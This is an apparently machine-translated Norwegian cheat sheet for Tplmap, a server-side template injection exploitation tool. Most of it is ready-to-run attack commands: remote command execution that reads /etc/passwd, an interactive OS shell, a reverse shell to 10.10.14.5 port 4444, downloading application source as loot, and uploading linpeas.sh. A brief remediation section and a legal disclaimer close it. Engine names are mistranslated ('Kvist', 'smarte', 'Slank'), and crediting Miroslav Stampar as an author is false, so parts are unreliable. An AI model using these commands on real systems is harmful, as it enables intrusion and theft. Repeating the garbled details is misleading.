<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p align="center">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Nettsikkerhet og API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Template Engines">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</p>

<p align="center">
  <b>🌐 Automatisert utnyttelsesverktøy utviklet for å oppdage og utnytte Server-Side Template Injection (SSTI) sårbarheter for å oppnå ekstern kjøring av kode</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Overview & The SSTI Vulnerability](#-overview--the-ssti-vulnerability)
- [Støttede malmotorer](#-støttede-malmotorer)
- [Installasjon](#-installasjon)
– [Basic Vulnerability Detection](#-basic-vulnerability-detection)
- [Målrettingsspesifikke injeksjonspunkter (`*`-markør)](#-målrettingsspesifikke-injeksjonspunkter--markør)
- [Fjernkommandoutførelse (`--os-cmd`)](#-remote-command-execution---os-cmd)
– [Interactive Shells & Reverse Connections](#-interactive-shells--reverse-connections)
- [Filopplasting og nedlasting](#-fil-opplasting--last ned)
– [Testing POST-data og topptekster](#-testing-post-data--headers)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og SSTI-sårbarheten

**Server-Side Template Injection (SSTI)** oppstår når en applikasjon bygger inn uvalidert brukerinndata direkte i en server-side mal i stedet for å sende den som data som skal gjengis. Fordi moderne malmotorer tillater syntaks som `{{7*7}}` eller `${7*7}`, kan angripere bryte ut av sandkassen og få tilgang til det underliggende kjøretidsmiljøet (Python, Java, PHP, Ruby, Node.js).

Skrevet av **Miroslav Stampar** og **Emilio Pinna**, fungerer **Tplmap** som "SQLMap for Template Engines". Den tar automatisk fingeravtrykk av den aktive malmotoren, bryter ut av malevalueringskontekster og eskalerer kodekjøring til full shell-tilgang på OS-nivå.

---

## 🧩 Støttede malmotorer

| Språk | Malmotorer som støttes |
|--------|-----------------------------|
| **Python** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Kvist, smarte |
| **Java** | Freemarker, Velocity |
| **Ruby** | ERB, Slank |
| **Node.js** | Jade, Pug, Dust.js |

---

## 📥 Installasjon

Tplmap er bygget på Python:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Grunnleggende sårbarhetsdeteksjon
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Ekstern kommandoutførelse (`--os-cmd`)

Når Tplmap oppdager motoren (f.eks. Jinja2), utfør vilkårlige skallkommandoer direkte:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Interaktive skall og omvendte tilkoblinger
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Filopplasting og nedlasting

Eksfiltrer kildekoden eller last opp persistensverktøy:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 Testing av POST-data og topptekster
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Oppdag SSTI i URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Kjør fjernkommando** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Interaktiv terminal** | `python tplmap.py -u "<URL>" --os-shell` |
| **Slipp omvendt skall** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Last ned ekstern fil** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Last opp lokal fil** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Test POST Body** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Defensive vurderinger og utbedring

1. **Kontekst-bevisst rømming:** Aldri sett sammen rå brukerinndata i malstrenger. Bruk malmotorens opprinnelige variable bindingsmekanisme (f.eks. i Jinja2: `render_template('hello.html', name=user_input)` i stedet for `render_template_string(f"Hello {user_input}")`).
2. **Sandbox-restriksjoner:** Håndhev streng sandboksing i motorer der dynamisk gjengivelse er uunngåelig, noe som hindrer tilgang til `__class__`, `__mro__` eller refleksjonsobjekter.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Tplmap kjører vilkårlig ekstern kode på målapplikasjonsservere. Testing eller utnyttelse av nettapplikasjoner uten skriftlig tillatelse er strengt ulovlig.